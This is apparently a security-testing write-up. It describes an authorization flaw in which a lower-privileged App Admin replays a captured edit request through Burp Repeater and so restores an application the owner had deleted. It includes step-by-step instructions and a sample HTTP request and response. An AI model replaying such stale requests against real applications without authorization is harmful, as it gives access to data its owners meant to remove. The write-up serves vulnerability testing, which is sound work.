## Use case

The application allowed lower-level administrators to resurrect previously deleted applications by replaying stale modification requests, leading to unauthorized access to sensitive application data.

## Steps to test

1. Create an organization and an application using Account A (Organization Owner).
2. Invite Account B as an App Admin to the organization.
3. Modify the application name in the UI as Account B and capture the HTTP edit request using Burp Suite.
4. Have Account A delete the application from the dashboard and confirm the application is no longer accessible.
5. Replay the captured edit request from Burp Repeater against the deleted application ID.
6. Observe the backend response and check if the application is restored in the UI.

## Commands

```text
POST /account/<ACCOUNT_ID>/app/<APP_ID> HTTP/1.1
Host: example.com
Content-Type: application/json
Authorization: Bearer <token>
{ "name": "Resurrected_App_Name" }
[Account A] Deletes Application  ---> Application marked deleted in UI
|
[Account B] Replays Old Request  -------------------> Backend accepts state edit
|
[Result] Application Restored   <--- Application resurrected in DB/UI
HTTP/1.1 200 OK
Content-Type: application/json
{
"app_id": "12345",
"name": "Resurrected_App_Name",
"created_at": "2026-08-15T04:26:00Z",
"status": "active"
}
```
